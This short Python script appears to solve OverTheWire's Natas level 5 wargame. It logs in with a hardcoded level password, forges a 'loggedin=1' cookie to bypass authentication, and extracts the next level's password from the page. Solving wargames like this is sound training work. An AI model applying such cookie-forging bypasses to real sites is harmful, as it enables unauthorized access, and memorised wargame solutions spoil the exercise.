#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org/' % username

cookies = dict(loggedin='1')

r = requests.get(url, auth=(username, password), cookies=cookies)

password = re.findall('(?<=natas6\sis\s)(.*)(?=</div>)', r.text)[0]

print(password)